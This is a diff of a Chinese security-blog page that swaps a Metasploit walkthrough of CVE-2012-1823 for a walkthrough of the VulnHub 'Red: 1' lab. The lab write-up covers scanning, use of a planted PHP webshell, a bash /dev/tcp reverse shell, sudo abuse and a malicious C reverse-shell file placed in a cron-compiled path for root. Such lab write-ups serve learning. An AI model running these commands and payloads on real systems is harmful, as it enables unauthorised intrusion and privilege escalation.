@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CVE-2012-1823 PHP-CGI 远程代码执行漏洞 - 信息安全实验室</title>
+<title>vulnhub靶场red:1教程 - 信息安全实验室</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" onload="this.onload=null;this.rel='stylesheet'">
@@ -20,9 +20,8 @@
   <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
   <div class="tags-bar">
     <a href="../index.html" class="tag tag-cyan">#首页</a>
-    <a href="../tags/list.html?tag=Vulhub" class="tag tag-cyan">#Vulhub</a>
-    <a href="../tags/list.html?tag=CVE" class="tag">#CVE</a>
-    <a href="../tags/list.html?tag=Web安全" class="tag tag-blue">#Web安全</a>
+    <a href="../tags/list.html?tag=vulnhub" class="tag tag-green">#vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="tag tag-blue">#渗透测试</a>
   </div>
   <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
 </div>
@@ -44,12 +43,11 @@
 <a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
 
 <div class="post">
-  <div class="post-date">2023 // 02 / 12</div>
-  <div class="post-title">CVE-2012-1823 PHP-CGI 远程代码执行漏洞</div>
+  <div class="post-date">2023 // 07 / 14</div>
+  <div class="post-title">vulnhub靶场red:1教程</div>
   <div class="post-tags">
-    <a href="../tags/list.html?tag=Web安全" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</a>
-    <a href="../tags/list.html?tag=Vulhub" class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">Vulhub</a>
-    <a href="../tags/list.html?tag=CVE" class="post-tag" style="background:#e4405f22;color:#e4405f;border:1px solid #e4405f44">CVE</a>
+    <a href="../tags/list.html?tag=vulnhub" class="post-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
   </div>
 
   <div class="post-content" style="display:block;border:none;padding:0;margin:0;">
@@ -57,54 +55,105 @@
     <nav class="post-toc">
       <span class="post-toc-title">// 目录</span>
       <ul>
-        <li class="toc-h4"><a href="#summary">漏洞危害</a></li>
-        <li class="toc-h4"><a href="#setup">漏洞搭建</a></li>
-        <li class="toc-h4"><a href="#exploit">漏洞利用</a></li>
+        <li class="toc-h4"><a href="#setup">靶场搭建</a></li>
+        <li class="toc-h4"><a href="#info">信息收集</a></li>
+        <li class="toc-h5"><a href="#info-scan">主机发现与端口扫描</a></li>
+        <li class="toc-h4"><a href="#web">Web 信息收集</a></li>
+        <li class="toc-h5"><a href="#web-domain">域名与 hosts 绑定</a></li>
+        <li class="toc-h5"><a href="#web-backdoor">后门扫描</a></li>
+        <li class="toc-h4"><a href="#exploit">NetworkFileManagerPHP 利用</a></li>
+        <li class="toc-h4"><a href="#shell">反弹 Shell</a></li>
+        <li class="toc-h4"><a href="#privesc">权限提升</a></li>
       </ul>
     </nav>
 
-    <h4 id="summary">漏洞危害</h4>
-    <p>CVE-2012-1823 就是 php-cgi 这个 sapi 出现的漏洞，本漏洞只出现在 cgi 模式运行的 php 中。影响范围：php &lt; 5.3.12 或 php &lt; 5.4.2。</p>
-    <p>这个漏洞简单来说，就是用户请求的 querystring 被作为了 php-cgi 的参数，最终导致了一系列结果。</p>
-    <p>探究一下原理，RFC3875 中规定，当 querystring 中不包含没有解码的 = 号的情况下，要将 querystring 作为 cgi 的参数传入。所以，Apache 服务器按要求实现了这个功能。但 PHP 并没有注意到 RFC 的这一个规则，也许是曾经注意并处理了，处理方法就是 web 上下文中不允许传入参数。</p>
-    <p>于是就导致了 php 不光可以通过命令行参数的方式传入 php-cgi，也可以通过 querystring 的方式传入。</p>
+    <h4 id="setup">靶场搭建</h4>
+    <p>靶机下载地址：<a href="https://www.vulnhub.com/entry/red-1,753/" target="_blank">Red: 1 ~ VulnHub</a></p>
+    <p>下载后直接使用 VMware 或 VirtualBox 导入即可。攻击机使用 Kali Linux，靶机网络设置为 NAT 模式。难度：中等。</p>
 
-    <h4 id="setup">漏洞搭建</h4>
-    <p>无其他搭建必须环境，搭建环境见 <a href="vulhub-setup.html">Vulhub 搭建方法</a>。</p>
+    <h4 id="info">信息收集</h4>
 
-    <h4 id="exploit">漏洞利用</h4>
-    <p>打开 msf：</p>
-    <pre><code>msfconsole</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image001.png" alt="msfconsole 启动"></p>
+    <h5 id="info-scan">主机发现与端口扫描</h5>
+    <p>使用 arp-scan 发现目标主机：</p>
+    <pre><code>arp-scan -l</code></pre>
+    <p>扫描端口：</p>
+    <pre><code>nmap --min-rate 1000 -p- 192.168.21.130</code></pre>
+    <p><img loading="lazy" src="../assets/vr_image001.png" alt="nmap 端口扫描"></p>
+    <pre><code>nmap -sT -sV -sC -O -p22,80 192.168.21.130</code></pre>
+    <p><img loading="lazy" src="../assets/vr_image002.png" alt="nmap 详细扫描"></p>
+    <p>开放端口：22（SSH）、80（HTTP）。</p>
 
-    <p>搜索目标漏洞编号：</p>
-    <pre><code>search cve-2012-1823</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image002.png" alt="search cve-2012-1823"></p>
+    <h4 id="web">Web 信息收集</h4>
+    <p>访问 80 端口：</p>
+    <p><img loading="lazy" src="../assets/vr_image003.png" alt="80 端口页面"></p>
+    <p>页面中有一个链接，点击发现无法直接访问：</p>
+    <p><img loading="lazy" src="../assets/vr_image004.png" alt="点击链接"></p>
+    <p>但页面告诉了你域名 <code>redrocks.win</code>，修改 hosts 文件（<code>/etc/hosts</code>）将域名指向靶机 IP：</p>
+    <p><img loading="lazy" src="../assets/vr_image005.png" alt="修改 hosts"></p>
+    <p><img loading="lazy" src="../assets/vr_image006.png" alt="hosts 绑定结果"></p>
+    <p>页面底部发现 "hacked by red"，暗示可能存在后门文件。</p>
 
-    <p>使用模块：</p>
-    <pre><code>use exploit/multi/http/php_cgi_arg_injection</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image003.png" alt="use module"></p>
+    <h5 id="web-backdoor">后门扫描</h5>
+    <p>使用 gobuster 扫描 PHP 后门文件：</p>
+    <pre><code>gobuster dir -u http://redrocks.win/ -w CommonBackdoors-PHP.txt</code></pre>
+    <p>（字典来自 <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt" target="_blank">SecLists CommonBackdoors-PHP.fuzz.txt</a>）</p>
+    <p><img loading="lazy" src="../assets/vr_image007.png" alt="gobuster 扫描"></p>
+    <p>成功找到后门文件，访问看看：</p>
+    <p><img loading="lazy" src="../assets/vr_image008.png" alt="后门文件"></p>
+    <p>页面纯白，没有内容：</p>
+    <p><img loading="lazy" src="../assets/vr_image009.png" alt="空白页面"></p>
 
-    <p>这里提示需要使用 payload 并告诉我们 payload 的名字直接使用它：</p>
-    <pre><code>set payload php/meterpreter/reverse_tcp</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image004.png" alt="set payload"></p>
+    <h4 id="exploit">NetworkFileManagerPHP 利用</h4>
+    <p>从 GitHub 找到对应源码：<a href="https://github.com/BlackArch/webshells/blob/master/php/NetworkFileManagerPHP.php" target="_blank">NetworkFileManagerPHP.php</a></p>
+    <p>这是一个功能强大的 PHP WebShell，内置多种功能：文件管理、端口扫描、FTP 爆破、反弹 Shell 等。关键参数：</p>
+    <ul>
+      <li><code>action=bash</code> — 绑定端口 4000 的 Shell</li>
+      <li><code>action=portscan</code> — 端口扫描</li>
+      <li><code>action=exploits</code> — 利用模块</li>
+      <li><code>action=down</code> — 远程文件下载</li>
+    </ul>
+    <p>端口列表中包含 <code>4444 = KRB524</code>，这是该靶机的关键漏洞入口。</p>
+    <p>访问后门并添加参数即可执行命令：</p>
+    <pre><code>http://redrocks.win/infos.php?action=bash</code></pre>
+    <p>这会绑定一个 Shell 到 4000 端口，用 telnet 连接即可获取初始访问。</p>
 
-    <p>查看需要配置的信息：</p>
-    <pre><code>show options</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image005.png" alt="show options"></p>
+    <h4 id="shell">反弹 Shell</h4>
+    <p>直接使用后门的 bindshell 功能连接，或者通过命令执行反弹 Shell：</p>
+    <pre><code>bash -c "bash -i >& /dev/tcp/192.168.21.131/4444 0>&1"</code></pre>
+    <p><img loading="lazy" src="../assets/vr_image011.png" alt="反弹 Shell"></p>
+    <p>获取稳定的 TTY Shell：</p>
+    <pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z
+stty raw -echo;fg
+# 输入 reset
+stty rows 46 columns 188</code></pre>
 
-    <p>我们要配置 rhost（目标靶机）和 rport（目标端口）：</p>
-    <pre><code>set rhost 192.168.221.129</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image006.png" alt="set rhost"></p>
-    <pre><code>set rport 8080</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image007.png" alt="set rport"></p>
-
-    <p>配置完后直接 run 就可以：</p>
-    <pre><code>run</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image008.png" alt="run 连接成功"></p>
-
-    <p>显示到这就是连接成功了，我们就能执行命令了：</p>
-    <p><img loading="lazy" src="../assets/vc_image009.png" alt="执行命令"></p>
+    <h4 id="privesc">权限提升</h4>
+    <p>首先查看当前用户可执行的 sudo 命令：</p>
+    <pre><code>sudo -l</code></pre>
+    <p><img loading="lazy" src="../assets/vr_image010.png" alt="sudo 检查"></p>
+    <p>发现 <code>ippsec</code> 用户可以通过 <code>/usr/bin/time</code> 以 sudo 权限执行命令：</p>
+    <pre><code>sudo -u ippsec /usr/bin/time /bin/bash</code></pre>
+    <p>但这只能切换到 ippsec 用户，仍需进一步提权。使用 pspy64s 监控后台进程：</p>
+    <p><img loading="lazy" src="../assets/vr_image012.png" alt="pspy64s 运行"></p>
+    <p><img loading="lazy" src="../assets/vr_image013.png" alt="pspy64s 输出 1"></p>
+    <p><img loading="lazy" src="../assets/vr_image014.png" alt="pspy64s 输出 2"></p>
+    <p>发现 <code>/var/www/wordpress/.git/supersecretfileuc.c</code> 会被定期编译并执行。删除原文件并写入恶意 C 代码：</p>
+    <p><img loading="lazy" src="../assets/vr_image015.png" alt="写入恶意代码"></p>
+    <pre><code># supersecretfileuc.c
+int main() {
+  char *argv[] = { "/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.21.131/6666 0>&1", NULL };
+  execve("/bin/bash", argv, NULL);
+  return 0;
+}</code></pre>
+    <p>上传文件到靶机：</p>
+    <pre><code>wget http://192.168.21.131:8000/supersecretfileuc.c</code></pre>
+    <p><img loading="lazy" src="../assets/vr_image016.png" alt="上传成功"></p>
+    <p>等待后台 cron 任务自动编译并执行该文件。监听本地端口：</p>
+    <pre><code>nc -lvnp 6666</code></pre>
+    <p>连接成功，获取 root 权限，查看 flag：</p>
+    <p><img loading="lazy" src="../assets/vr_image017.png" alt="root flag"></p>
 
   </div>
 </div>
